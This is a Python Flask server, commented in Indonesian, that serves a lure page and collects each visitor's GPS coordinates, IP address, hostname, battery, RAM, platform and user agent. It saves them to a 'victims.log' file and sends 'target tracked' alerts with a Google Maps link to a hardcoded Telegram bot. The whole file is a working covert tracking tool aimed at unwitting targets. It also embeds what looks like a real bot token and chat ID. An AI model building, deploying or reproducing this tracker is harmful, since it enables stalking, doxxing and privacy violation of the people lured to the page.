from flask import Flask, request, send_from_directory
import datetime, os, json, socket, requests

app = Flask(__name__)

# === KONFIG TELEGRAM ===
TELEGRAM_TOKEN = "7614148489:AAFuwjUfdI41MTRxz_b_p7T_yNbiTkVyVs0"
TELEGRAM_CHAT_ID = "8180344345"

def kirim_telegram(pesan):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": pesan,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        requests.post(url, data=data)
    except:
        print("❌ Gagal kirim ke Telegram.")

# === REVERSE GEOCODING ===
def get_location_info(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
        headers = {'User-Agent': 'CobraMD-Locator'}
        res = requests.get(url, headers=headers)
        data = res.json()
        address = data.get("address", {})

        daerah = address.get("suburb") or address.get("village") or address.get("state_district") or "Unknown"
        kota = address.get("city") or address.get("town") or address.get("county") or "Unknown"
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        return maps_link, kota, daerah
    except:
        return "GAGAL AMBIL MAP", "Unknown", "Unknown"

# === HALAMAN UTAMA ===
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# === API TERIMA LOG ===
@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except:
        hostname = "Unknown"

    latitude = data.get("lat")
    longitude = data.get("lon")
    accuracy = data.get("acc")
    user_agent = data.get("ua")
    memory = data.get("memory", "Unknown")
    platform = data.get("platform", "Unknown")
    battery = data.get("battery", "Unknown")

    location_status = "✅ LOKASI TEREKAM" if latitude else "❌ GAGAL REKAM"

    if latitude and longitude:
        maps_link, kota, daerah = get_location_info(latitude, longitude)
    else:
        maps_link, kota, daerah = "-", "Unknown", "Unknown"

    log_data = {
        "time": time,
        "ip": ip,
        "hostname": hostname,
        "location": {
            "latitude": latitude,
            "longitude": longitude,
            "accuracy": accuracy,
            "maps": maps_link,
            "kota": kota,
            "daerah": daerah
        },
        "device": {
            "battery": battery,
            "ram": memory,
            "platform": platform,
            "user-agent": user_agent
        }
    }

    os.makedirs("logs", exist_ok=True)
    safe_ip = ip.replace(".", "_")
    filename = f"logs/{safe_ip}_{time.replace(':', '-')}.json"

    with open(filename, "w") as f:
        json.dump(log_data, f, indent=2)

    with open("victims.log", "a") as f:
        f.write(json.dumps(log_data, indent=2) + "\n---\n")

    with open("device.log", "a") as f:
        f.write(json.dumps({
            "ip": ip,
            "time": time,
            "battery": battery,
            "ram": memory,
            "platform": platform,
            "user-agent": user_agent
        }, indent=2) + "\n---\n")

    # === KIRIM TELEGRAM ===
    if latitude:
        msg = f"""<b>🐍 TARGET TERLACAK</b>
<b>📍 Lokasi:</b> <a href="{maps_link}">Klik Buka Maps</a>
<b>🌆 Daerah:</b> {daerah}
<b>🏙️ Kota:</b> {kota}

<b>💻 IP:</b> <code>{ip}</code>
<b>🕒 Waktu:</b> {time}

<b>🔋 Baterai:</b> {battery}
<b>💾 RAM:</b> {memory} GB
<b>🧱 Platform:</b> {platform}
"""
    else:
        msg = f"""<b>🚨 TARGET MENOLAK LOKASI</b>
<b>💻 IP:</b> <code>{ip}</code>
<b>🕒 Waktu:</b> {time}
<b>🧬 User-Agent:</b> {user_agent}
<b>🔋 Baterai:</b> {battery}
<b>💾 RAM:</b> {memory} GB
<b>🧱 Platform:</b> {platform}
"""

    kirim_telegram(msg)

    # === CETAK KE TERMINAL
    print("\n" + "="*60)
    print(f" ☠️  [ADA YANG MASUK SARANG ULAR] — {ip}")
    print(f" 🕒 Waktu        : {time}")
    print(f" 🌐 Hostname     : {hostname}")
    print(f" 📡 Lokasi       : {location_status}")
    if latitude:
        print(f"    ↪️ Latitude    : {latitude}")
        print(f"    ↪️ Longitude   : {longitude}")
        print(f"    ↪️ Akurasi     : {accuracy} m")
        print(f" 🗺️ Maps Link    : {maps_link}")
        print(f" 🏞️ Daerah        : {daerah}")
        print(f" 🏙️ Kota/Asal     : {kota}")
    print(f" 📱 Device       :")
    print(f"    🔋 Baterai    : {battery}")
    print(f"    💾 RAM        : {memory}")
    print(f"    🧱 Platform    : {platform}")
    print(f" 🧬 User-Agent   : {user_agent}")
    print("="*60)

    return "OK"

# === JALANKAN SERVER ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)